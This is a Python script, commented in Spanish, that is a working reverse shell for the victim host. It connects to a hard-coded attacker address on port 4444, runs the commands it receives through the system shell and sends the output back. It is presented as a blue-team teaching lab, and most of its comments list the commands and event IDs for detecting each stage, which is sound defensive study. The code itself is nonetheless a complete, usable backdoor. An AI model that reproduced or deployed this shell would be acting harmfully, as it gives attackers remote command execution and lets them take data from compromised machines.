#!/usr/bin/env python3
# =============================================================================
# REVERSE SHELL - LADO DE LA VÍCTIMA
# PROPÓSITO: Proyecto educativo de seguridad defensiva (Blue Team)
# ADVERTENCIA: Solo usar en laboratorio aislado propio
# COMPATIBILIDAD: Windows + Linux
# =============================================================================

# ┌─────────────────────────────────────────────────────────────────────────┐
# │ IMPORTACIÓN DE LIBRERÍAS                                                │
# └─────────────────────────────────────────────────────────────────────────┘
import socket, subprocess, sys

    # socket     → Comunicaciones de red
    # subprocess → Ejecutar comandos del sistema
    # sys        → Detección de sistema operativo
    #
    # 🛡️ DETECCIÓN: python + subprocess = ALERTA INMEDIATA
    # 🛡️ MANJARO: sudo ausearch -c python3
    # 🛡️ WINDOWS: Get-EventLog -LogName Application | Where-Object {$_.Message -like "*Python*"}

# ┌─────────────────────────────────────────────────────────────────────────┐
# │ FUNCIÓN DE EJECUCIÓN DE COMANDOS - COMPATIBLE WINDOWS/LINUX             │
# └─────────────────────────────────────────────────────────────────────────┘
def ejecutarComando(command):

    command_str = command.decode('utf-8', errors='ignore')

    return subprocess.check_output(command_str, shell=True)

        # check_output() → Ejecuta comando y captura salida
        # shell=True     → Ejecuta a través del shell
        # decode()       → Convierte bytes a string (Windows lo requiere)
        #
        # 🛡️ DETECCIÓN: python → cmd/bash - EL MAYOR IoC
        # 🛡️ MANJARO: sudo ausearch -c python3 --start recent
        # 🛡️ WINDOWS: Get-EventLog -LogName Security | Where-Object {$_.EventID -eq 4688}
        
        # Decodificar bytes a string (necesario en Windows)    

# ┌─────────────────────────────────────────────────────────────────────────┐
# │ CREACIÓN DEL SOCKET                                                     │
# └─────────────────────────────────────────────────────────────────────────┘

connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # socket.socket() → Crea endpoint de red
    # AF_INET         → IPv4
    # SOCK_STREAM     → TCP
    #
    # 🛡️ DETECCIÓN: sudo lsof -i -P -n | grep python (Linux)
    # 🛡️ DETECCIÓN: netstat -ano | findstr "python" (Windows)

# ┌─────────────────────────────────────────────────────────────────────────┐
# │ CONEXIÓN SALIENTE - PUNTO DE DETECCIÓN #1 ⚠️                            │
# └─────────────────────────────────────────────────────────────────────────┘

connection.connect(("192.168.1.39", 4444))

    # connect()       → Conecta al atacante
    # 192.168.1.39    → IP del atacante
    # 4444            → Puerto del atacante
    #
    # 🛡️ DETECCIÓN #1: Conexión SALIENTE a puerto 4444
    # 🛡️ MANJARO: sudo ss -antp | grep 4444
    # 🛡️ WINDOWS: netstat -ano | findstr "4444"

# ┌─────────────────────────────────────────────────────────────────────────┐
# │ ENVÍO DE BEACON - PUNTO DE DETECCIÓN #2 ⚠️                              │
# └─────────────────────────────────────────────────────────────────────────┘

connection.send(" \n [+]Conexion Exitosamente Establecida \n".encode('utf-8'))

    # send()          → Envía beacon al atacante
    # encode('utf-8') → Convierte string a bytes
    #
    # 🛡️ DETECCIÓN #2: Firma "Conexion Exitosamente"
    # 🛡️ MANJARO: sudo tcpdump -i any port 4444 -X
    # 🛡️ WINDOWS: Wireshark tcp.port == 4444

# ┌─────────────────────────────────────────────────────────────────────────┐
# │ BUCLE PRINCIPAL - ESPERA DE COMANDOS                                    │
# └─────────────────────────────────────────────────────────────────────────┘

while True:
    
    # ┌─────────────────────────────────────────────────────────────────────┐
    # │ RECEPCIÓN DE COMANDOS - PUNTO DE DETECCIÓN #3                       │
    # └─────────────────────────────────────────────────────────────────────┘
    
    command = connection.recv(1024)
    
        # recv(1024) → Recibe comandos del atacante (bytes)
        #
        # 🛡️ DETECCIÓN #3: Tráfico entrante
        # 🛡️ MANJARO: sudo tcpdump -i any port 4444 -n -v
        # 🛡️ WINDOWS: netstat -ano | findstr "ESTABLISHED"
        
    # ┌─────────────────────────────────────────────────────────────────────┐
    # │ EJECUCIÓN DE COMANDO - PUNTO DE DETECCIÓN #4 ⚠️                     │
    # └─────────────────────────────────────────────────────────────────────┘
    
    try:
        resultadosComando = ejecutarComando(command)
    except Exception as e:
        # Si hay error, enviar mensaje de error al atacante
        resultadosComando = str(e).encode('utf-8')
    
            # ejecutarComando() → Ejecuta el comando
            # command.decode()  → Convierte bytes a string (Windows)
            #
            # 🛡️ DETECCIÓN #4: python → cmd/bash (EL MAYOR IoC)
            # 🛡️ MANJARO: sudo ausearch -c python3 --start recent
            # 🛡️ WINDOWS: Get-EventLog -LogName Security | Where-Object {$_.EventID -eq 4688}
    
    # ┌─────────────────────────────────────────────────────────────────────┐
    # │ ENVÍO DE RESULTADOS - EXFILTRACIÓN ⚠️                               │
    # └─────────────────────────────────────────────────────────────────────┘
    
    connection.send(resultadosComando)
    
        # send() → Envía resultados (exfiltración)
        #
        # 🛡️ DETECCIÓN #5: Datos salientes sensibles
        # 🛡️ MANJARO: sudo tcpdump -i any port 4444 -w exfil.pcap
        # 🛡️ WINDOWS: Wireshark tcp.port == 4444

# ┌─────────────────────────────────────────────────────────────────────────┐
# │ CIERRE DE CONEXIÓN - NUNCA SE EJECUTA ⚠️                                │
# └─────────────────────────────────────────────────────────────────────────┘

# connection.close()  ← Fuera del while, nunca se ejecuta